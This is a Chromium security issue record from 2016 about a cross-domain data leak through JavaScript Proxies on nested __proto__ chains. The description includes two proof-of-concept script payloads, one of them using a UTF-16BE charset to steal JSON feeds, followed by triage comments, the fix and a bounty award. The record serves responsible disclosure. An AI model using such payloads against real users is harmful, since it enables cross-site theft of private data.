# Security: Stealing data cross domain using proxies and stealing JSON data using UTF-16BE

| Field | Value |
|-------|-------|
| **Issue ID** | [40085614](https://issues.chromium.org/issues/40085614) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Language |
| **Reporter** | ga...@portswigger.net |
| **Assignee** | li...@chromium.org |
| **Created** | 2016-10-06 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

Whilst doing some research at Portswigger I discovered that in Chrome JavaScript Proxies are leaking undefined JavaScript variables. Using this vulnerability I can steal data cross domain.

<script>
\_\_proto\_\_.\_\_proto\_\_.\_\_proto\_\_.\_\_proto\_\_.\_\_proto\_\_=new Proxy(\_\_proto\_\_,{
has:function f(target,name){
var str = f.caller.toString();
alert(str);
}
});
</script>
<script src="http://external-url/external-script"></script>
<!-- external script contains stealme -->

So although you've blocked a single **proto** being overwritten with a proxy you forgot how deeply nested **proto** can go :) what's interesting is that name doesn't leak the data but the caller does the undefined variable is actually a function, toString seems to be required in order to access the text.

It doesn't end there, using this technique I can use a UTF-16BE charset to steal JSON feeds provided that the characters converted combine to produce a valid JavaScript variable.

<script>
\_\_proto\_\_.\_\_proto\_\_.\_\_proto\_\_.\_\_proto\_\_.\_\_proto\_\_=new Proxy(\_\_proto\_\_,{
has:function f(target,name){
var str = f.caller.toString();
alert(str.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff); }));
}
});
</script>
<script src="http://external-url/external-script" charset="UTF-16BE"></script>
<!-- external script contains {"abc":"testa"} -->

The anon function in the replace goes through each character and converts it from UTF-16BE by decoding the first and second byte. By shifting 8 bits for the first and masking for the second byte. What's interesting about UTF-16BE is that even new lines are converted since two byes form a character.

I've attached two test cases, one demonstrating the proxy steal vulnerability and one with the UTF-16BE charset vulnerability. Both files require modification to point to the correct external url.

**VERSION**  

Chrome version 53.0.2785.143 64 bit Linux/Windows 10/OS X

## Attachments

- [chrome_steal_data_using_proxy.zip](attachments/chrome_steal_data_using_proxy.zip) (application/octet-stream, 779 B)
- [chrome_steal_json_data_using_proxy_utf-16BE.zip](attachments/chrome_steal_json_data_using_proxy_utf-16BE.zip) (application/octet-stream, 953 B)

## Timeline

### ts...@chromium.org (2016-10-06)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript]

### jo...@chromium.org (2016-10-06)

Assigning to Adam in case you have some cycles today.

### ha...@chromium.org (2016-10-06)

[Empty comment from Monorail migration]

[Monorail components: -Blink>JavaScript Blink>JavaScript>Language]

### ts...@chromium.org (2016-10-06)

[Empty comment from Monorail migration]

### ad...@chromium.org (2016-10-06)

01b8e7c7f62fe0fc74552c7d3909777fa50b3447 was supposed to deal with cases like this until we changed Object.prototype.__proto__ to be immutable, but it seems that it may be too narrowly-targeted at [[Get]]: the test case here uses a "has" trap which appears to fire where a "get" trap would not (though I haven't been able to confirm that hunch yet).

### sh...@chromium.org (2016-10-21)

adamk: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@chromium.org (2016-10-24)

The right fix for this is to make the global and its prototypes have immutable [[Prototype]] slots. Depending on how long that will take to deploy, we might want to consider a band-aid for the "has" trap similar to what we do for "get".

### ga...@portswigger.net (2016-10-24)

This seems fixed to me on Version 54.0.2840.71 (64-bit)
I now get the following error:
Uncaught TypeError: Immutable prototype object '#<Object>' cannot have their prototype set(…)

### sh...@chromium.org (2016-11-04)

littledan: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### li...@chromium.org (2016-11-04)

Current status: I have a couple patches out for review which implement the immutable prototype chain. These should provide a defense in depth against the attack described at the top of this thread.

### sh...@chromium.org (2016-12-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-06)

We commit ourselves to a 60 day deadline for fixing for high severity vulnerabilities, and have exceeded it here. If you're unable to look into this soon, could you please find another owner or remove yourself so that this gets back into the security triage queue?

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ga...@portswigger.net (2017-01-03)

Any update on this issue? For me it seems fixed

### li...@chromium.org (2017-01-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-06)

Your change meets the bar and is auto-approved for M56. Please go ahead and merge the CL manually. Please contact milestone owner if you have questions.
Owners: amineer@(clank), cmasso@(bling), gkihumba@(cros), bustamante@(desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2017-01-13)

littledan@ - do you have bug or commit numbers for #10?  Cheers!

### li...@chromium.org (2017-01-13)

This was fixed by https://codereview.chromium.org/2452073002/

### aw...@chromium.org (2017-01-23)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-23)

Congratulations! The panel decided to award $3,000 for this bug!  A member of our finance team will be in touch to arrange payment.

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an established charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2017-01-23)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-24)

The change referred to in #20 was made before the M56 branch, so no merge needed.

### aw...@chromium.org (2017-02-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-04-12)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### ad...@google.com (2019-06-07)

gareth.heyes@portswigger.net - hi. I'm going through older issues ensuring that reporters are correctly credited in release notes, prior to officially submitting CVE descriptions, and I'm sorry to say that this bug wasn't mentioned in the release notes. (https://chromereleases.googleblog.com/2017/01/stable-channel-update-for-desktop.html) I'm putting it in belatedly now - please let me know how you'd like to be credited. Sorry for the multi-year delay! I'll keep it anonymous until I hear from you.

### aw...@chromium.org (2019-06-27)

[Empty comment from Monorail migration]

### is...@google.com (2019-06-27)

This issue was migrated from crbug.com/chromium/653555?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocked-on: crbug.com/v8/5149]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085614)*
